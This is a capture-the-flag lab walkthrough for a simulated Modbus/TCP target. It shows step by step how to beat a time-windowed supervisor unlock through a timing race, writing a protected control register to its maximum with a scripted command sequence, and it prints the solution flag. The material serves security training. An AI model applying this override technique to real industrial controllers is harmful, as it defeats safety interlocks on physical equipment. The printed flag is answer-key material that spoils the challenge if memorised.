# Challenge 7 — Maintenance Override

**Protocol:** Modbus/TCP · **Port:** 502/tcp · **Toolkit module:** `modbus`

---

## The Story

A maintenance-override path is gated behind a supervisor **unlock** register and a short time
window. A background reconciliation loop constantly compares the maintenance rod against the value it
considers "last authorised": if you move the rod while the unlock is open it *legitimises* the change
(TOCTOU), but if the window has closed it *reverts* the rod back to baseline. Open the window, drive
the rod to maximum inside it, let the loop bless that value, then hold it long enough to win.

## What You Know

- Target is `10.0.1.1:502`.
- **HR20** is the supervisor unlock; **HR21** is the maintenance rod (writes rejected unless the
  unlock is currently open).
- The unlock opens **only on a rising edge (0 → 1)** and stays effective for ~**2 s**, then
  auto-resets to 0.
- The maintenance rod's baseline is **10**; its maximum (the override target) is **100**.
- Input registers carry the reconciliation telemetry: **IR72** = unlock expiry countdown, **IR73** =
  the value the loop currently treats as authorised, **IR74** = the solve condition (0/1).
- The flag is published in the input registers at **IR48** (16 registers) once the override holds.

## Step 1: Map the register space

<details>
<summary>Hint</summary>

Read broadly first — both the sensor/status side and anything that looks like a lock/gate flag.
</details>

<details>
<summary>Show command</summary>

```bash
./bin/sysrupt target set 10.0.1.1
./bin/sysrupt modbus read-input 0 16
./bin/sysrupt modbus read-input 70 6     # reconciliation telemetry block (IR70..75)
```

Note IR73 (last-authorised rod) sitting at the baseline `10`.
</details>

## Step 2: Confirm the gate and find the timing

<details>
<summary>Hint</summary>

A direct write to the protected rod register fails while the unlock is closed. After you *try* to
unlock, look for a register that counts down or flips back — that's the window timer.
</details>

<details>
<summary>Show command</summary>

```bash
./bin/sysrupt modbus write 21 100       # rod write with no unlock -> rejected ("no positive response")
./bin/sysrupt modbus write 20 1         # request the unlock
./bin/sysrupt modbus read-input 72 1    # IR72 = remaining unlock window in ms (counts down to 0)
```
</details>

## Step 3: Understand the two traps before you script it

Two things make a naive attempt fail silently:

1. **The unlock is edge-triggered, not level-triggered.** It opens only on a `0 → 1` transition. If
   you (or an earlier command) already left HR20 commanded `1`, another `write 20 1` is **not** a new
   edge — the window never reopens and your rod write is rejected with *"Request sent (no positive
   response)"*. Always drive HR20 **low first** (`write 20 0`) so the next `write 20 1` is a real
   rising edge.
2. **The window is short (~2 s) and the reconciliation loop reverts you.** Two separate `sysrupt`
   invocations (two TCP connections, human reaction time between) won't land the rod write inside the
   window. Use the `sequence` engine, which runs all steps over **one persistent connection** on a
   monotonic clock.

## Step 4: Build the timed sequence

<details>
<summary>Hint</summary>

Re-arm the edge (`write 20 0`), open the window (`write 20 1`), slam the rod to max inside the window
(`write 21 100`), then read back IR73 after a short pause to confirm the loop legitimised it.
</details>

<details>
<summary>Show command</summary>

Save as `maint.seq.json`:

```json
{
  "name": "maint-override",
  "steps": [
    { "command": "modbus write 20 0" },
    { "command": "modbus write 20 1", "deadline_ms": 1000 },
    { "command": "modbus write 21 100", "deadline_ms": 1800 },
    { "command": "modbus verify 73 100 --input", "delay_before_ms": 400 }
  ]
}
```

- `"deadline_ms"` — this step must finish within that many ms of the sequence starting.
- `"delay_before_ms"` — wait this long before the step (here, to let the ~100 ms reconciliation loop
  legitimise the rod before you read IR73).

```bash
./bin/sysrupt sequence validate maint.seq.json
./bin/sysrupt sequence run maint.seq.json
```

**Success signal:** the `modbus write 21 100` step must report **`Protocol acknowledgement
received`**. If it instead says *`Request sent (no positive response)`*, the rod write was rejected —
the unlock window wasn't open (missing rising edge), so re-check Step 3.
</details>

## Step 5: Confirm it held, then read the flag

<details>
<summary>Hint</summary>

A write that lands inside the window but isn't legitimised gets reverted a moment later — so verify
IR73 actually reads `100` (not `10`). The override must then stay legitimised for ~**10 s** before the
solve latches and the flag block populates at IR48.
</details>

<details>
<summary>Show command</summary>

```bash
./bin/sysrupt modbus verify 73 100 --input    # IR73 -> 100 (loop now treats max as authorised)
sleep 11                                        # ride out the ~10 s stable hold
./bin/sysrupt modbus read-input 74 1            # IR74 (solve condition) -> [1]
./bin/sysrupt modbus read-input 48 16           # the flag — read the "ascii:" line
```

The flag appears at IR48 once the hold completes:

```
wired{t0ct0u_r0d_0verr1d3_pwn}
```

</details>

Notes:
- Don't hammer the unlock: **more than 6 rising edges within ~2 s** trips a maintenance reset and a
  ~3 s lockout that ignores unlock requests. If writes start failing after many retries, wait a few
  seconds and re-run the sequence once.
- If you ever get stuck with the rod reverting to `10`, a plain `modbus write 20 0` re-arms the edge
  for the next attempt.

## What You Learned

- Why a TOCTOU-style gate (unlock → short window → protected write) defeats a naive two-command shell
  session, and how a persistent-connection sequence engine solves that.
- That an **edge-triggered** control won't re-fire on a repeated same-value write — you must return it
  to the opposite state first to re-arm it.
- How to build and validate a `sysrupt sequence` JSON file with `deadline_ms`/`delay_before_ms`.
- To re-check a write after the fact rather than trusting the immediate response, since a background
  reconciliation loop can silently revert it — and that the flag only lands after the legitimised
  state is *held*, not the instant the write is accepted.
